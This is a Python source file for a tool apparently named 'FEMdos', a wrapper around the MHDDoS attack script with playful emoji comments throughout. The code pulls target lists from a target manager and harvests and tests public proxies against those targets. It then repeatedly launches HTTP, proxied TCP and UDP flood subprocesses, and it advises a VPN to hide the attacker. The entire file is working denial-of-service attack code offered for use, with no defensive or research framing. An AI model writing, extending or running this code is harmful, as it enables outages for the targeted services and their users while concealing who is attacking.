import argparse
import json
import multiprocessing
import os
import random
import subprocess
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import psutil  # To monitor CPU usage and handle processes

from MHDDoS.start import ProxyManager
from PyRoxy import ProxyChecker, ProxyType
from targman import TargetManager, Target

# FEMdos Theme Activated! 💖✨
# Let's keep it fabulous, darling! 💅💖

# Target Manager for all things FEMdos! 💖✨
_TargetManager = TargetManager()

# Variable to store the latest targets
current_targets = []

# Function to update the targets periodically
def update_targets(period):
    global current_targets
    current_targets = _TargetManager.get_all_targets()
    print(f"✨ Targets updated: {len(current_targets)} fabulous targets! 💖✨")
    # Schedule the next update after the given period
    threading.Timer(period, update_targets, [period]).start()

# Let's update our proxies like a fab queen updating her wardrobe 💖✨
def update_proxies(period: int, proxy_timeout: float, total_threads: int, targets: list):
    if os.path.exists('files/proxies/proxies.txt'):
        last_update = os.path.getmtime('files/proxies/proxies.txt')
        if (time.time() - last_update) < period / 2:
            return  # Proxies are already fab enough for now!

    with open('../proxies_config.json') as f:
        config = json.load(f)

    proxies = list(ProxyManager.DownloadFromConfig(config, 0))
    random.shuffle(proxies)

    checked_proxies = []
    size = len(targets)
    print(f'✨ Checking {len(proxies):,} proxies... Get ready for some action! 💖')

    with ThreadPoolExecutor(size) as executor:
        futures = [
            executor.submit(
                ProxyChecker.checkAll,
                proxies=proxies[i::size],
                timeout=proxy_timeout,
                threads=total_threads // size,
                url=target.url
            )
            for i, target in enumerate(targets)
        ]

        for future in as_completed(futures):
            checked_proxies.extend(future.result())

    if not checked_proxies:
        sys.exit("💔 Proxy check failed! Network troubles or target not available. Let's fix that, darling!")

    # Writing down the proxies like a queen writes her memoirs 💅
    os.makedirs('files/proxies/', exist_ok=True)
    with open('files/proxies/proxies.txt', "w") as all_wr, \
         open('files/proxies/socks4.txt', "w") as socks4_wr, \
         open('files/proxies/socks5.txt', "w") as socks5_wr:
        for proxy in checked_proxies:
            proxy_str = f"{proxy}\n"
            all_wr.write(proxy_str)
            if proxy.type == ProxyType.SOCKS4:
                socks4_wr.write(proxy_str)
            elif proxy.type == ProxyType.SOCKS5:
                socks5_wr.write(proxy_str)
def run_ddos(targets: list, total_threads: int, period: int, rpc: int, udp_threads: int, http_methods: list, debug: bool, cpu_limit: float):
    threads_per_target = total_threads // len(targets)
    params_list = []

    processes = []
    
    for target in targets:
        if target.url.lower().startswith('udp://'):
            print(f"💔 Oh darling, UDP targets can't have proxies. Make sure VPN is on! Target: {target.url}")
            params_list.append(['UDP', target.url[6:], str(udp_threads), str(period)])
        elif target.url.lower().startswith('tcp://'):
            for socks_type, socks_file in [('4', 'socks4.txt'), ('5', 'socks5.txt')]:
                params_list.append(['TCP', target.url[6:], str(threads_per_target // 2), str(period), socks_type, socks_file])
        else:
            method = random.choice(target.methods)
            params_list.append([method, target.url, '0', str(threads_per_target), 'proxies.txt', str(rpc), str(period)])

    # Convert all elements in params to strings
    params_list = [list(map(str, params)) for params in params_list]

    # The fabulous processes are on the move! 💖
    for params in params_list:
        p = subprocess.Popen([sys.executable, './start.py', *params])  # Unpack params list
        processes.append(p)

    # Monitor CPU usage and kill processes if the limit is exceeded
    monitor_cpu_usage(processes, cpu_limit)

    for p in processes:
        p.wait()


def monitor_cpu_usage(processes, cpu_limit):
    """
    Monitors CPU usage and kills processes if the usage exceeds the given limit.
    """
    while True:
        cpu_percent = psutil.cpu_percent(interval=1)
        print(f"✨ Current CPU usage: {cpu_percent}% 💖")

        if cpu_percent > cpu_limit:
            print(f"💔 CPU usage exceeded {cpu_limit}%. Killing some processes to maintain fabulousness!")
            # Kill a process to reduce CPU load
            process_to_kill = random.choice(processes)
            print(f"✨ Killing process {process_to_kill.pid} to reduce CPU load 💖✨")
            psutil.Process(process_to_kill.pid).terminate()
            processes.remove(process_to_kill)

        time.sleep(5)  # Check every 5 seconds

# Let’s kick it off and keep the FEMdos magic rolling! 💅✨
def start(total_threads: int, period: int, targets: list, rpc: int, udp_threads: int, http_methods: list, proxy_timeout: float, debug: bool, cpu_limit: float):
    os.chdir('MHDDoS')  # FEMdos headquarters! 💖
    no_proxies = all(target.url.lower().startswith('udp://') for target in targets)

    while True:
        if not no_proxies:
            update_proxies(period, proxy_timeout, total_threads, targets)
        run_ddos(targets, total_threads, period, rpc, udp_threads, http_methods, debug, cpu_limit)


# FEMdos, making arguments fabulous! 💅✨
def init_argparse() -> argparse.ArgumentParser:
    """
    FEMdos argument parser, for all the fabulous input you’ll need! 💖✨

    Returns:
    -------
    argparse.ArgumentParser
        The fabulous argument parser, darling!
    """
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--threads', type=int, default=100 * multiprocessing.cpu_count(),
                        help='Total number of threads (default is 100 * CPU cores) 💅✨')
    parser.add_argument('-p', '--period', type=int, default=300,
                        help='How often to update the proxies (in seconds) 💖✨')
    parser.add_argument('--proxy-timeout', type=float, default=2, metavar='TIMEOUT',
                        help='How long to wait for a proxy connection (default is 2) 💅✨')
    parser.add_argument('--rpc', type=int, default=50,
                        help='Requests to send per proxy (default is 50) 💖✨')
    parser.add_argument('--udp-threads', type=int, default=1,
                        help='Threads for UDP targets 💅✨')
    parser.add_argument('--debug', action='store_true', default=False,
                        help='Enable debug output from FEMdos (because we need to stay fabulous) 💖✨')
    parser.add_argument('--http-methods', nargs='+', default=['GET', 'STRESS', 'BOT', 'SLOW'],
                        help='List of HTTP(s) attack methods to use. Default: GET, STRESS, BOT, SLOW 💅✨')
    parser.add_argument('--cpu-limit', type=float, default=20.0,
                        help='Max CPU usage limit as a percentage (default is 20%) 💖✨')
    return parser


# FEMdos Target Manager at your service! 💖✨
def get_methods_for_target(target: Target) -> list:
    """
    Get the best HTTP methods for each target. Because darling, we need only the best! 💖✨

    Parameters:
    ----------
    target : Target
        The target URL.

    Returns:
    -------
    list
        List of HTTP methods that are tailored for the target 💅✨
    """
    return target.methods


# FEMdos in action! 💅✨
def main():
    args = init_argparse().parse_args()
    
    # Initial target fetch and update
    update_targets(600)
    
    # Starting the periodic update loop
    threading.Timer(args.period, update_targets, [600]).start()

    while True:
        if current_targets:
            methods = [get_methods_for_target(target) for target in current_targets]
            start(args.threads, args.period, current_targets, args.rpc, args.udp_threads, methods, args.proxy_timeout, args.debug, args.cpu_limit)
        else:
            print("💔 No targets available! Please check the target manager.")
            time.sleep(args.period)


if __name__ == "__main__":
    main()
